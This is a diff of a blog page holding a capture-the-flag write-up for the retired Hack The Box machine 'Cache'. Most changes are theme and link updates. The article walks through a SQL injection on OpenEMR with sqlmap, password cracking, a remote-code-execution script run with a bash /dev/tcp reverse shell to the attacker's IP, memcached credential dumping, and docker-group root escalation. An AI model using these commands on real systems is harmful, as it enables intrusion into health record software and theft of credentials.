@@ -3,43 +3,81 @@
 <head>
 
     <title>HTB Write-up | Cache</title>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="HandheldFriendly" content="True" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=aa2daa7cee.css" />
-
-    <link rel="canonical" href="index.html" />
-    <meta name="referrer" content="no-referrer-when-downgrade" />
-    <link rel="amphtml" href="amp/index.html" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <meta property="og:type" content="article" />
-    <meta property="og:title" content="HTB Write-up | Cache" />
-    <meta property="og:description" content="Write-up for Cache, a retired HTB machine." />
-    <meta property="og:url" content="inesmartins.github.io/htb-write-up-cache/" />
-    <meta property="og:image" content="inesmartins.github.io/content/images/2020/10/cache.png" />
-    <meta property="article:published_time" content="2020-10-22T08:51:40.000Z" />
-    <meta property="article:modified_time" content="2021-02-19T15:04:38.000Z" />
-    <meta property="article:tag" content="htb" />
-    <meta property="article:tag" content="linux" />
-    <meta property="article:tag" content="cache" />
-    <meta property="article:tag" content="memcached" />
-    <meta property="article:tag" content="privesc" />
-    <meta property="article:tag" content="docker" />
-    <meta property="article:tag" content="openemr" />
+    <link rel="preload" as="style" href="../assets/built/screen.css%3Fv=e213fc6d24.css">
+    <link rel="preload" as="script" href="../assets/built/source.js%3Fv=e213fc6d24">
     
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="HTB Write-up | Cache" />
-    <meta name="twitter:description" content="Write-up for Cache, a retired HTB machine." />
-    <meta name="twitter:url" content="inesmartins.github.io/htb-write-up-cache/" />
-    <meta name="twitter:image" content="inesmartins.github.io/content/images/2020/10/cache.png" />
-    <meta name="twitter:label1" content="Written by" />
-    <meta name="twitter:data1" content="Inês Martins" />
-    <meta name="twitter:label2" content="Filed under" />
-    <meta name="twitter:data2" content="htb, linux, cache, memcached, privesc, docker, openemr" />
-    <meta property="og:image:width" content="598" />
-    <meta property="og:image:height" content="380" />
+    <link rel="preload" as="font" type="font/woff2" href="../assets/fonts/inter-roman.woff2%3Fv=e213fc6d24" crossorigin="anonymous">
+<style>
+    @font-face {
+        font-family: "Inter";
+        font-style: normal;
+        font-weight: 100 900;
+        font-display: optional;
+        src: url(../assets/fonts/inter-roman.woff2%3Fv=e213fc6d24) format("woff2");
+        unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+</style>
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=e213fc6d24.css">
+
+    <style>
+        :root {
+            --background-color: #ffffff
+        }
+    </style>
+
+    <script>
+        /* The script for calculating the color contrast has been taken from
+        https://gomakethings.com/dynamically-changing-the-text-color-based-on-background-color-contrast-with-vanilla-js/ */
+        var accentColor = getComputedStyle(document.documentElement).getPropertyValue('--background-color');
+        accentColor = accentColor.trim().slice(1);
+
+        if (accentColor.length === 3) {
+            accentColor = accentColor[0] + accentColor[0] + accentColor[1] + accentColor[1] + accentColor[2] + accentColor[2];
+        }
+
+        var r = parseInt(accentColor.substr(0, 2), 16);
+        var g = parseInt(accentColor.substr(2, 2), 16);
+        var b = parseInt(accentColor.substr(4, 2), 16);
+        var yiq = ((r * 299) + (g * 587) + (b * 114)) / 1000;
+        var textColor = (yiq >= 128) ? 'dark' : 'light';
+
+        document.documentElement.className = `has-${textColor}-text`;
+    </script>
+
+    <meta name="description" content="Write-up for Cache, a retired HTB machine.">
+    <link rel="canonical" href="index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="HTB Write-up | Cache">
+    <meta property="og:description" content="Write-up for Cache, a retired HTB machine.">
+    <meta property="og:url" content="inesmartins.github.io/htb-write-up-cache/">
+    <meta property="og:image" content="inesmartins.github.io/content/images/2020/10/cache.png">
+    <meta property="article:published_time" content="2020-10-22T08:51:40.000Z">
+    <meta property="article:modified_time" content="2021-02-19T15:04:38.000Z">
+    <meta property="article:tag" content="htb">
+    <meta property="article:tag" content="linux">
+    <meta property="article:tag" content="cache">
+    <meta property="article:tag" content="memcached">
+    <meta property="article:tag" content="privesc">
+    <meta property="article:tag" content="docker">
+    <meta property="article:tag" content="openemr">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="HTB Write-up | Cache">
+    <meta name="twitter:description" content="Write-up for Cache, a retired HTB machine.">
+    <meta name="twitter:url" content="inesmartins.github.io/htb-write-up-cache/">
+    <meta name="twitter:image" content="inesmartins.github.io/content/images/2020/10/cache.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Inês Martins">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="htb, linux, cache, memcached, privesc, docker, openemr">
+    <meta property="og:image:width" content="598">
+    <meta property="og:image:height" content="380">
     
     <script type="application/ld+json">
 {
@@ -59,16 +97,8 @@
     "author": {
         "@type": "Person",
         "name": "Inês Martins",
-        "image": {
-            "@type": "ImageObject",
-            "url": "inesmartins.github.io/content/images/2022/08/1658857349956.jpeg",
-            "width": 420,
-            "height": 420
-        },
         "url": "inesmartins.github.io/author/ines/",
-        "sameAs": [
-            "https://www.linkedin.com/in/ines-af-martins/"
-        ]
+        "sameAs": []
     },
     "headline": "HTB Write-up | Cache",
     "url": "inesmartins.github.io/htb-write-up-cache/",
@@ -82,16 +112,13 @@
     },
     "keywords": "htb, linux, cache, memcached, privesc, docker, openemr",
     "description": "Write-up for Cache, a retired HTB machine.",
-    "mainEntityOfPage": {
-        "@type": "WebPage",
-        "@id": "inesmartins.github.io/"
-    }
+    "mainEntityOfPage": "inesmartins.github.io/htb-write-up-cache/"
 }
     </script>
 
-    <meta name="generator" content="Ghost 4.7" />
-    <link rel="alternate" type="application/rss+xml" title="" href="../rss/index.html" />
-    <script defer src="https://unpkg.com/@tryghost/portal@~1.5.1/umd/portal.min.js" data-ghost="inesmartins.github.io/"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+    <meta name="generator" content="Ghost 6.10">
+    <link rel="alternate" type="application/rss+xml" title="" href="../rss/index.html">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.56/umd/portal.min.js" data-i18n="true" data-ghost="inesmartins.github.io/" data-key="592cb4e4fa1ab0f3f4adbed719" data-api="inesmartins.github.io/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
 .gh-post-upgrade-cta {
     display: flex;
     flex-direction: column;
@@ -155,6 +182,12 @@
 .gh-post-upgrade-cta a.gh-btn:hover {
     opacity: 0.92;
 }</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="592cb4e4fa1ab0f3f4adbed719" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="inesmartins.github.io/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="inesmartins.github.io/webmentions/receive/" rel="webmention">
+    <script defer src="../public/cards.min.js%3Fv=e213fc6d24"></script>
+    <link rel="stylesheet" type="text/css" href="../public/cards.min.css%3Fv=e213fc6d24.css">
+    <script defer src="../public/member-attribution.min.js%3Fv=e213fc6d24"></script><style>:root {--ghost-accent-color: #000000;}</style>
     <link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
 <link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
 <!-- Injects copyright and footer -->
@@ -187,92 +220,81 @@
     	    margin: 20px auto;
 	    }
     }
-</style><style>:root {--ghost-accent-color: #000000;}</style>
+</style>
 
 </head>
-<body class="post-template tag-htb tag-linux tag-cache tag-memcached tag-privesc tag-docker tag-openemr">
-<div class="viewport">
+<body class="post-template tag-htb tag-linux tag-cache tag-memcached tag-privesc tag-docker tag-openemr tag-hash-import-2026-01-03-19-09 has-sans-title has-sans-body">
 
-    <header id="gh-head" class="gh-head has-cover">
-        <nav class="gh-head-inner inner gh-container">
+<div class="gh-viewport">
+    
+    <header id="gh-navigation" class="gh-navigation is-middle-logo gh-outer">
+    <div class="gh-navigation-inner gh-inner">
 
-            <div class="gh-head-brand">
-                <a class="gh-head-logo" href="../index.html">
-                        
-                </a>
-                <a class="gh-burger" role="button">
-                    <div class="gh-burger-box">
-                        <div class="gh-burger-inner"></div>
-                    </div>
-                </a>
-            </div>
-            <div class="gh-head-menu">
-                <ul class="nav">
+        <div class="gh-navigation-brand">
+            <a class="gh-navigation-logo is-title" href="../index.html">
+                    
+            </a>
+            <button class="gh-burger gh-icon-button" aria-label="Menu">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 256 256"><path d="M224,128a8,8,0,0,1-8,8H40a8,8,0,0,1,0-16H216A8,8,0,0,1,224,128ZM40,72H216a8,8,0,0,0,0-16H40a8,8,0,0,0,0,16ZM216,184H40a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16Z"></path></svg>                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 256 256"><path d="M205.66,194.34a8,8,0,0,1-11.32,11.32L128,139.31,61.66,205.66a8,8,0,0,1-11.32-11.32L116.69,128,50.34,61.66A8,8,0,0,1,61.66,50.34L128,116.69l66.34-66.35a8,8,0,0,1,11.32,11.32L139.31,128Z"></path></svg>            </button>
+        </div>
+
+        <nav class="gh-navigation-menu">
+            <ul class="nav">
     <li class="nav-home"><a href="../index.html">Home</a></li>
     <li class="nav-about"><a href="../about-me/index.html">About</a></li>
 </ul>
 
-            </div>
-            <div class="gh-head-actions">
-                <div class="gh-social">
-                </div>
-
-                    <a class="gh-head-button" href="index.html#/portal/signup">Subscribe</a>
-            </div>
         </nav>
-    </header>
 
-    <main>
-        
-
-
-
-<article class="article post tag-htb tag-linux tag-cache tag-memcached tag-privesc tag-docker tag-openemr">
-
-    <header class="article-header gh-canvas">
-
-        <section class="article-tag">
-            <a href="../tag/htb/index.html">htb</a>
-        </section>
-
-        <h1 class="article-title">HTB Write-up | Cache</h1>
-
-        <p class="article-excerpt">Write-up for Cache, a retired HTB machine.</p>
-
-        <div class="article-byline">
-            <section class="article-byline-content">
-                <ul class="author-list">
-                    <li class="author-list-item">
-                        <a href="../author/ines/index.html" class="author-avatar">
-                            <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
-                        </a>
-                    </li>
-                </ul>
-                <div class="article-byline-meta">
-                    <h4 class="author-name"><a href="../author/ines/index.html">Inês Martins</a></h4>
-                    <div class="byline-meta-content">
-                        <time class="byline-meta-date" datetime="2020-10-22">Oct 22, 2020</time>
-                        <span class="byline-reading-time"><span class="bull">&bull;</span> 9 min read</span>
-                    </div>
-                </div>
-            </section>
+        <div class="gh-navigation-actions">
         </div>
 
-        <figure class="article-image">
-            <img
-                srcset="../content/images/size/w300/2020/10/cache.png 300w,
-                       ../content/images/size/w600/2020/10/cache.png 600w,
-                      ../content/images/size/w1000/2020/10/cache.png 1000w,
-                     ../content/images/size/w2000/2020/10/cache.png 2000w"
-                sizes="(min-width: 1400px) 1400px, 92vw"
-                src="../content/images/size/w2000/2020/10/cache.png"
-                alt="HTB Write-up | Cache"
-            />
-        </figure>
-    </header>
+    </div>
+</header>
 
-    <section class="gh-content gh-canvas">
-        <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/251">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>We start with our usual scanning which finds only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ sudo nmap -sV -sC -A -T4 cache.htb
+    
+
+<main class="gh-main">
+
+    <article class="gh-article post tag-htb tag-linux tag-cache tag-memcached tag-privesc tag-docker tag-openemr tag-hash-import-2026-01-03-19-09">
+
+        <header class="gh-article-header gh-canvas">
+
+                <a class="gh-article-tag" href="../tag/htb/index.html">htb</a>
+            <h1 class="gh-article-title is-title">HTB Write-up | Cache</h1>
+                <p class="gh-article-excerpt is-body">Write-up for Cache, a retired HTB machine.</p>
+
+            <div class="gh-article-meta">
+                <div class="gh-article-author-image instapaper_ignore">
+                            <a href="../author/ines/index.html"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
+</a>
+                </div>
+                <div class="gh-article-meta-wrapper">
+                    <h4 class="gh-article-author-name"><a href="../author/ines/index.html">Inês Martins</a></h4>
+                    <div class="gh-article-meta-content">
+                        <time class="gh-article-meta-date" datetime="2020-10-22">22 Oct 2020</time>
+                            <span class="gh-article-meta-length"><span class="bull">—</span> 9 min read</span>
+                    </div>
+                </div>
+            </div>
+
+                <figure class="gh-article-image">
+        <img
+            srcset="../content/images/size/w320/2020/10/cache.png 320w,
+                   ../content/images/size/w600/2020/10/cache.png 600w,
+                  ../content/images/size/w960/2020/10/cache.png 960w,
+                 ../content/images/size/w1200/2020/10/cache.png 1200w,
+                ../content/images/size/w2000/2020/10/cache.png.png 2000w"
+            sizes="(max-width: 1200px) 100vw, 1120px"
+            src="../content/images/size/w1200/2020/10/cache.png"
+            alt="HTB Write-up | Cache"
+        >
+    </figure>
+
+        </header>
+
+        <section class="gh-content gh-canvas is-body">
+            <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/251?ref=localhost">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>We start with our usual scanning which finds only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ sudo nmap -sV -sC -A -T4 cache.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 18:21 WEST
 Nmap scan report for cache.htb (10.10.10.188)
 Host is up (0.042s latency).
@@ -289,18 +311,18 @@ PORT   STATE SERVICE VERSION
 |_http-title: Cache
 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
 </code></pre>
-<!--kg-card-end: markdown--><p>The website hosted on <code>cache.htb</code> is very simple: there are only a couple of HTML pages with some text about hacking.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/06/index.png" class="kg-image" alt loading="lazy"></figure><p>There's also a very simple <a href="http://cache.htb/login.html">Login page</a>:</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/06/login-2.png" class="kg-image" alt loading="lazy"></figure><p>The credentials for this authentication form are hardcoded on a <a href="http://cache.htb/jquery/functionality.js">JS file</a>:</p><!--kg-card-begin: markdown--><pre><code>user: ash
+<!--kg-card-end: markdown--><p>The website hosted on <code>cache.htb</code> is very simple: there are only a couple of HTML pages with some text about hacking.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/06/index.png" class="kg-image" alt loading="lazy"></figure><p>There's also a very simple <a href="http://cache.htb/login.html?ref=localhost">Login page</a>:</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/06/login-2.png" class="kg-image" alt loading="lazy"></figure><p>The credentials for this authentication form are hardcoded on a <a href="http://cache.htb/jquery/functionality.js?ref=localhost">JS file</a>:</p><!--kg-card-begin: markdown--><pre><code>user: ash
 password: H@v3_fun
 </code></pre>
-<!--kg-card-end: markdown--><p>Using these credentials on the form we're redirected to the <a href="http://cache.htb/net.html">Net page</a>, which doesn't seem to have anything of relevance.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/06/net.png" class="kg-image" alt loading="lazy"></figure><p>The <a href="http://cache.htb/author.html">Author page</a>, on the other hand, seems to have some interesting information:</p><pre><code class="language-html">&lt;div class="card"&gt;
+<!--kg-card-end: markdown--><p>Using these credentials on the form we're redirected to the <a href="http://cache.htb/net.html?ref=localhost">Net page</a>, which doesn't seem to have anything of relevance.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/06/net.png" class="kg-image" alt loading="lazy"></figure><p>The <a href="http://cache.htb/author.html?ref=localhost">Author page</a>, on the other hand, seems to have some interesting information:</p><pre><code class="language-html">&lt;div class="card"&gt;
   &lt;img src="logo1.jpg" alt="John" style="width:100%"&gt;
   &lt;h1&gt;ASH&lt;/h1&gt;
   &lt;p class="title"&gt;CEO &amp; Founder, CACHE&lt;/p&gt;
   &lt;a href="http://cache.htb"&gt;cache.htb&lt;/a&gt;
   &lt;h3&gt;&lt;font color="Grey"&gt;ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author &amp; Creator of Cache. Check out his other projects like Cache:&lt;p&gt; HMS(Hospital Management System)
-&lt;/font&gt;&lt;/h3&gt; </code></pre><p>So, a couple of interesting things:</p><ul><li>the CEO and Founder of CACHE is someone named ASH (also maybe John according to the alt tag);</li><li>ASH is also the creator of another project called HMS;</li></ul><p>I was certain that HMS was an important clue, but wasn't completely sure how to access it, until I realised that it was an alternative <a href="https://httpd.apache.org/docs/2.4/vhosts/examples.html">virtual host</a>.<strong> </strong>So, in order to display this other website, all we have to do is change our <code>/etc/hosts</code> configuration:</p><!--kg-card-begin: markdown--><pre><code>10.10.10.188 hms.htb
+&lt;/font&gt;&lt;/h3&gt; </code></pre><p>So, a couple of interesting things:</p><ul><li>the CEO and Founder of CACHE is someone named ASH (also maybe John according to the alt tag);</li><li>ASH is also the creator of another project called HMS;</li></ul><p>I was certain that HMS was an important clue, but wasn't completely sure how to access it, until I realised that it was an alternative <a href="https://httpd.apache.org/docs/2.4/vhosts/examples.html?ref=localhost">virtual host</a>.<strong> </strong>So, in order to display this other website, all we have to do is change our <code>/etc/hosts</code> configuration:</p><!--kg-card-begin: markdown--><pre><code>10.10.10.188 hms.htb
 </code></pre>
-<!--kg-card-end: markdown--><hr><h2 id="exploiting-openemr-vulnerabilities">Exploiting OpenEMR Vulnerabilities</h2><p>When we access <a href="http://hms.htb/">hms.htb</a> we're redirected to a <a href="http://hms.htb/interface/login/login.php?site=default">login page</a> for <a href="https://www.open-emr.org/">OpenEMR</a>, which is an "open source electronic health records and medical practice management solution".</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/06/login-3.png" class="kg-image" alt loading="lazy"></figure><p>Turns out OpenEMR has a lot of well-known vulnerabilities, which are very thoroughly detailed <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">here</a>.</p><p>As indicated on these docs, we can check the <a href="http://hms.htb/admin.php">admin.php</a> file for the exact version of the application:</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/06/vulns.png" class="kg-image" alt loading="lazy"></figure><p>This version is vulnerable to multiple SQL Injection vulnerabilities. There's actually a very good <a href="https://www.youtube.com/watch?time_continue=115&amp;v=DJSQ8Pk_7hc&amp;feature=emb_logo">video tutorial</a> for this exploit, but in very simple terms it works as follows:</p><ol><li>capture the GET request to a <a href="http://hms.htb/portal/add_edit_event_user.php">portal page</a> with <a href="https://portswigger.net/burp">Burp</a> or any other proxy;</li><li>copy that request to a file and then add a parameter (?eid=1) to the URL:</li></ol><!--kg-card-begin: markdown--><pre><code>~ sudo nano openemr.req
+<!--kg-card-end: markdown--><hr><h2 id="exploiting-openemr-vulnerabilities">Exploiting OpenEMR Vulnerabilities</h2><p>When we access <a href="http://hms.htb/?ref=localhost">hms.htb</a> we're redirected to a <a href="http://hms.htb/interface/login/login.php?site=default&ref=localhost">login page</a> for <a href="https://www.open-emr.org/?ref=localhost">OpenEMR</a>, which is an "open source electronic health records and medical practice management solution".</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/06/login-3.png" class="kg-image" alt loading="lazy"></figure><p>Turns out OpenEMR has a lot of well-known vulnerabilities, which are very thoroughly detailed <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf?ref=localhost">here</a>.</p><p>As indicated on these docs, we can check the <a href="http://hms.htb/admin.php?ref=localhost">admin.php</a> file for the exact version of the application:</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/06/vulns.png" class="kg-image" alt loading="lazy"></figure><p>This version is vulnerable to multiple SQL Injection vulnerabilities. There's actually a very good <a href="https://www.youtube.com/watch?time_continue=115&v=DJSQ8Pk_7hc&feature=emb_logo&ref=localhost">video tutorial</a> for this exploit, but in very simple terms it works as follows:</p><ol><li>capture the GET request to a <a href="http://hms.htb/portal/add_edit_event_user.php?ref=localhost">portal page</a> with <a href="https://portswigger.net/burp?ref=localhost">Burp</a> or any other proxy;</li><li>copy that request to a file and then add a parameter (?eid=1) to the URL:</li></ol><!--kg-card-begin: markdown--><pre><code>~ sudo nano openemr.req
 
 GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
 Host: hms.htb
@@ -314,7 +336,7 @@ Accept-Language: en-US,en;q=0.9,pt-PT;q=0.8,pt;q=0.7
 Cookie: OpenEMR=ektggh73sf93fg6kg9ctif9km6; PHPSESSID=mff3bosse1qitlik842hl4ud4f
 Connection: close
 </code></pre>
-<!--kg-card-end: markdown--><p>3. use <a href="http://sqlmap.org/">sqlmap</a> to exploit the aforementioned SQL injection vulnerabilities, starting with the enumeration of the available databases:</p><!--kg-card-begin: markdown--><pre><code>~ sqlmap -r openemr.req --threads=10 --dbs
+<!--kg-card-end: markdown--><p>3. use <a href="http://sqlmap.org/?ref=localhost">sqlmap</a> to exploit the aforementioned SQL injection vulnerabilities, starting with the enumeration of the available databases:</p><!--kg-card-begin: markdown--><pre><code>~ sqlmap -r openemr.req --threads=10 --dbs
 
 available databases [2]:
 [*] information_schema
@@ -324,7 +346,7 @@ available databases [2]:
 </code></pre>
 <!--kg-card-end: markdown--><p>And voilà!<br>The users_secure table has only one user - <strong>openemr_admin</strong> - and now we know their hashed password, which we'll crack using john:</p><!--kg-card-begin: markdown--><pre><code>$ john -w=rockyou.txt hash.txt 
 </code></pre>
-<!--kg-card-end: markdown--><p>Now that we have a valid user/password combination, we can use <a href="https://www.exploit-db.com/exploits/45161">this script</a> to help us get the RCE (it took a bit of tweaking to get the script to work, since the base64 encoding was not working properly):</p><!--kg-card-begin: markdown--><pre><code>~ python3 openemr_rce.py http://hms.htb -u openemr_admin -p xxxxxx -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.43/4444 0&gt;&amp;1&quot;
+<!--kg-card-end: markdown--><p>Now that we have a valid user/password combination, we can use <a href="https://www.exploit-db.com/exploits/45161?ref=localhost">this script</a> to help us get the RCE (it took a bit of tweaking to get the script to work, since the base64 encoding was not working properly):</p><!--kg-card-begin: markdown--><pre><code>~ python3 openemr_rce.py http://hms.htb -u openemr_admin -p xxxxxx -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.43/4444 0&gt;&amp;1&quot;
 </code></pre>
 <!--kg-card-end: markdown--><hr><h2 id="getting-user">Getting user</h2><p>As always, we check the <code>/etc/passwd</code> file to check the system's users:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:/$ cat /etc/passwd
 
@@ -362,11 +384,11 @@ luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
 memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
 mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
 </code></pre>
-<!--kg-card-end: markdown--><p>There are 2 interesting users: <strong>ash</strong> and <strong>luffy</strong>:</p><ul><li>ash we already know - they're the CEO of both Cache and HMS. </li><li>luffy, however, means nothing to us at this point (but this is the name of a <a href="https://en.wikipedia.org/wiki/One_Piece">OnePiece</a> character, which combined with the image on the <a href="http://10.10.10.188/net.html">Net page</a> page might be a little clue).</li></ul><hr><h3 id="using-su">Using su</h3><p>We now have a couple of credentials that we want to test for both ash and luffy, however when we try to use <code>su</code>, we get the following error message:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:/var/www/hms.htb/public_html$ su -u ash
+<!--kg-card-end: markdown--><p>There are 2 interesting users: <strong>ash</strong> and <strong>luffy</strong>:</p><ul><li>ash we already know - they're the CEO of both Cache and HMS. </li><li>luffy, however, means nothing to us at this point (but this is the name of a <a href="https://en.wikipedia.org/wiki/One_Piece?ref=localhost">OnePiece</a> character, which combined with the image on the <a href="http://10.10.10.188/net.html?ref=localhost">Net page</a> page might be a little clue).</li></ul><hr><h3 id="using-su">Using su</h3><p>We now have a couple of credentials that we want to test for both ash and luffy, however when we try to use <code>su</code>, we get the following error message:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:/var/www/hms.htb/public_html$ su -u ash
 su -u ash
 su: must be run from a terminal
 </code></pre>
-<!--kg-card-end: markdown--><p>After some Googling I realised that this means this machine is running inside a<a href="https://www.docker.com/"> </a>container. <a href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal">This StackOverflow answer</a> helped me go around it by using a <a href="https://netsec.ws/?p=337">TTY shell</a>:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:$ echo &quot;import pty; pty.spawn('/bin/bash')&quot; &gt; /tmp/abc.py
+<!--kg-card-end: markdown--><p>After some Googling I realised that this means this machine is running inside a<a href="https://www.docker.com/?ref=localhost"> </a>container. <a href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal?ref=localhost">This StackOverflow answer</a> helped me go around it by using a <a href="https://netsec.ws/?p=337&ref=localhost">TTY shell</a>:</p><!--kg-card-begin: markdown--><pre><code>www-data@cache:$ echo &quot;import pty; pty.spawn('/bin/bash')&quot; &gt; /tmp/abc.py
 www-data@cache:$ python3 /tmp/abc.py
 www-data@cache:$ rm /tmp/abc.py
 www-data@cache:$ su - ash
@@ -417,13 +439,13 @@ ash@cache:~$
  [ + ]  unattended-upgrades
  [ - ]  uuidd
 </code></pre>
-<!--kg-card-end: markdown--><p>Because of the name of the machine I decided to start by checking out the process in which <a href="https://memcached.org/">memcached</a> is running:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~$ ps aux | grep memcached
+<!--kg-card-end: markdown--><p>Because of the name of the machine I decided to start by checking out the process in which <a href="https://memcached.org/?ref=localhost">memcached</a> is running:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~$ ps aux | grep memcached
 
 memcache   961  0.0  0.0 425792  4032 ?        Ssl  14:07   0:02 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
 ash       7525  0.0  0.0 416308  2480 pts/5    Sl+  16:25   0:00 memcached
 ash       8590  0.0  0.0  13136  1048 pts/6    S+   16:27   0:00 grep --color=auto memcached
 </code></pre>
-<!--kg-card-end: markdown--><blockquote>Memcached is an in-memory key-value store for small chunks of arbitrary data (strings, objects) from results of database calls, API calls, or page rendering. (...) [It's] intended for use in speeding up dynamic web applications by alleviating database load. [<a href="https://memcached.org/">Source</a>]</blockquote><p>Now that we know the port this service is using, let's see if there's anything useful cached on the server:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~$ nc 127.0.0.1 11211
+<!--kg-card-end: markdown--><blockquote>Memcached is an in-memory key-value store for small chunks of arbitrary data (strings, objects) from results of database calls, API calls, or page rendering. (...) [It's] intended for use in speeding up dynamic web applications by alleviating database load. [<a href="https://memcached.org/?ref=localhost">Source</a>]</blockquote><p>Now that we know the port this service is using, let's see if there's anything useful cached on the server:</p><!--kg-card-begin: markdown--><pre><code>ash@cache:~$ nc 127.0.0.1 11211
 nc 127.0.0.1 11211
 stats items
 stats items
@@ -476,7 +498,7 @@ VALUE passwd 0 9
 0n3_p1ec3
 END
 </code></pre>
-<!--kg-card-end: markdown--><p>And there we go! We're now luffy!</p><hr><h2 id="getting-root">Getting root</h2><p>Knowing that luffy is a part of the docker group we only need a bit of googling to find a potential priv esc path:</p><blockquote>The problem arises when the docker group is assigned to the host user. Since docker is running as root with SGID, an unauthorised person who has access to the host user (with user privileges) can easily escalate privileges by mounting the host volume to one of the containers; granting the attacker full access to the filesystem. [<a href="https://root4loot.com/post/docker-privilege-escalation/">Source</a>]</blockquote><p>So, as specified on the article, we start by listing the available containers:</p><!--kg-card-begin: markdown--><pre><code>luffy@cache:~$ docker container ps
+<!--kg-card-end: markdown--><p>And there we go! We're now luffy!</p><hr><h2 id="getting-root">Getting root</h2><p>Knowing that luffy is a part of the docker group we only need a bit of googling to find a potential priv esc path:</p><blockquote>The problem arises when the docker group is assigned to the host user. Since docker is running as root with SGID, an unauthorised person who has access to the host user (with user privileges) can easily escalate privileges by mounting the host volume to one of the containers; granting the attacker full access to the filesystem. [<a href="https://root4loot.com/post/docker-privilege-escalation/?ref=localhost">Source</a>]</blockquote><p>So, as specified on the article, we start by listing the available containers:</p><!--kg-card-begin: markdown--><pre><code>luffy@cache:~$ docker container ps
 </code></pre>
 <!--kg-card-end: markdown--><!--kg-card-begin: markdown--><table>
 <thead>
@@ -516,194 +538,202 @@ END
 <!--kg-card-end: markdown--><p>Since we're root, we can print the root flag from its relative path to the mount point.</p><!--kg-card-begin: markdown--><pre><code>root@a5d39b0a924a:/# cat /mnt/root/root/root.txtcat 
 </code></pre>
 <!--kg-card-end: markdown--><hr>
-    </section>
+        </section>
+
+    </article>
 
 
-</article>
-
-<section class="footer-cta">
-    <div class="inner">
-        <h2>Sign up for more like this.</h2>
-        <a class="footer-cta-button" href="index.html#/portal">
-            <div>Enter your email</div>
-            <span>Subscribe</span>
